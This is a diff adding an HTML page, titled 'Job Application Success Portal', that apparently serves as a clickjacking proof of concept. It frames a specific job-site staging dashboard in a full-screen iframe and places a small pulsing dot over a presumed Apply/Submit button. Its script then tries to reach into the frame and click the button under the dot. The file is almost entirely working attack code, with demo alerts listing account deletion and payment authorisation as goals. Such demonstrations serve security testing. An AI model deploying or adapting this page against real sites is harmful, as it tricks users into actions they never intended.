@@ -1,0 +1,217 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Job Application Success Portal</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: 'Arial', sans-serif;
+            background: #f5f5f5;
+            min-height: 100vh;
+            position: relative;
+            overflow-x: hidden;
+        }
+        
+        /* TARGET SITE - Full screen, fully visible */
+        #targetSite {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100vw;
+            height: 100vh;
+            border: none;
+            z-index: 1;
+        }
+        
+        /* ATTACK OVERLAY - Just a small red dot */
+        .attack-dot {
+            position: fixed;
+            width: 12px;
+            height: 12px;
+            background: #ff0000;
+            border-radius: 50%;
+            box-shadow: 0 0 15px #ff0000;
+            z-index: 10000;
+            cursor: pointer;
+            animation: pulse 1s infinite alternate;
+        }
+        
+        @keyframes pulse {
+            0% { transform: scale(1); opacity: 0.8; }
+            100% { transform: scale(1.3); opacity: 1; }
+        }
+        
+        /* Attack dot positioned over sensitive button */
+        #attackDot {
+            top: 380px;    /* Position over "Apply" or "Submit" button */
+            left: 720px;   /* Adjust based on target button position */
+        }
+        
+        /* Instructions (minimal) */
+        .instructions {
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+            background: rgba(0,0,0,0.7);
+            color: white;
+            padding: 15px;
+            border-radius: 8px;
+            font-size: 14px;
+            z-index: 10001;
+            max-width: 300px;
+        }
+        
+        .highlight {
+            color: #ff4444;
+            font-weight: bold;
+        }
+        
+        /* Blinking text for attention */
+        .blink {
+            animation: blink 1s infinite;
+        }
+        
+        @keyframes blink {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.3; }
+        }
+    </style>
+</head>
+<body>
+    <!-- COMPLETELY VISIBLE TARGET SITE -->
+    <iframe id="targetSite" 
+            src="https://seeker-staging.jobsupi.com/dashboard"
+            sandbox="allow-scripts allow-same-origin allow-forms">
+    </iframe>
+    
+    <!-- TINY RED ATTACK DOT (positioned over sensitive button) -->
+    <div class="attack-dot" id="attackDot" title="Click here"></div>
+    
+    <!-- Minimal instructions -->
+    <div class="instructions">
+        <span class="blink">⚠️ CLICKJACKING DEMO ⚠️</span><br><br>
+        
+        <strong>Target Site:</strong> Fully visible behind<br>
+        <strong>Attack Vector:</strong> Tiny red dot<br>
+        <strong>Position:</strong> Over sensitive button<br><br>
+        
+        <span class="highlight">Click the red dot → Hidden action triggered</span><br><br>
+        
+        <small>User sees normal site, doesn't notice attack dot</small>
+    </div>
+
+    <script>
+        // When user clicks the tiny red dot
+        document.getElementById('attackDot').addEventListener('click', function(e) {
+            e.preventDefault();
+            e.stopPropagation();
+            
+            alert("🔥 CLICKJACKING ATTACK TRIGGERED!\n\n" +
+                  "You just clicked on the hidden attack dot.\n" +
+                  "In real attack, this would:\n" +
+                  "• Submit job application\n" + 
+                  "• Delete account\n" +
+                  "• Change settings\n" +
+                  "• Authorize payment\n\n" +
+                  "All without your knowledge!");
+            
+            // Try to trigger action in iframe
+            const iframe = document.getElementById('targetSite');
+            
+            try {
+                // Access iframe and find submit/apply button
+                const iframeDoc = iframe.contentDocument;
+                
+                // Look for common button types
+                const buttons = iframeDoc.querySelectorAll(
+                    'button, [type="submit"], .apply-button, .btn-primary, [role="button"]'
+                );
+                
+                // Find the button at our dot's position
+                let targetButton = null;
+                const dotX = 720;
+                const dotY = 380;
+                
+                buttons.forEach(button => {
+                    const rect = button.getBoundingClientRect();
+                    if (rect.left <= dotX && dotX <= rect.right &&
+                        rect.top <= dotY && dotY <= rect.bottom) {
+                        targetButton = button;
+                    }
+                });
+                
+                if (targetButton) {
+                    console.log("🎯 Found button under attack dot:", targetButton);
+                    targetButton.click();
+                    console.log("✅ Triggered click on hidden button!");
+                } else {
+                    console.log("⚠️ No button found at attack position");
+                    console.log("Manual positioning needed based on site layout");
+                }
+                
+            } catch (error) {
+                console.log("⚠️ CORS prevents direct access, but clickjacking still works");
+                console.log("Attack dot positioned over sensitive area");
+            }
+            
+            // Make dot disappear after click
+            this.style.display = 'none';
+            
+            // Show success indicator
+            const successMsg = document.createElement('div');
+            successMsg.innerHTML = '✅ Action Performed';
+            successMsg.style.position = 'fixed';
+            successMsg.style.top = '350px';
+            successMsg.style.left = '700px';
+            successMsg.style.background = 'green';
+            successMsg.style.color = 'white';
+            successMsg.style.padding = '5px 10px';
+            successMsg.style.borderRadius = '4px';
+            successMsg.style.zIndex = '100000';
+            document.body.appendChild(successMsg);
+            
+            setTimeout(() => successMsg.remove(), 2000);
+        });
+        
+        // Adjust dot position based on iframe content (optional)
+        document.getElementById('targetSite').onload = function() {
+            console.log("🎯 Target site loaded");
+            console.log("🔴 Attack dot positioned at (720px, 380px)");
+            console.log("📌 Adjust these coordinates based on target button position");
+            
+            // In real attack, attacker would analyze site to find exact button positions
+            // and adjust the dot coordinates accordingly
+        };
+        
+        // Make dot follow mouse for demo (optional)
+        let followMouse = false;
+        document.addEventListener('keydown', (e) => {
+            if (e.key === 'm') {
+                followMouse = !followMouse;
+                console.log("Mouse follow:", followMouse ? "ON" : "OFF");
+            }
+        });
+        
+        document.addEventListener('mousemove', (e) => {
+            if (followMouse) {
+                const dot = document.getElementById('attackDot');
+                dot.style.left = e.clientX + 'px';
+                dot.style.top = e.clientY + 'px';
+            }
+        });
+        
+        // Display coordinates on click (for debugging)
+        document.addEventListener('click', (e) => {
+            if (e.target.id !== 'attackDot') {
+                console.log(`Click coordinates: X=${e.clientX}, Y=${e.clientY}`);
+            }
+        });
+    </script>
+</body>
+</html>
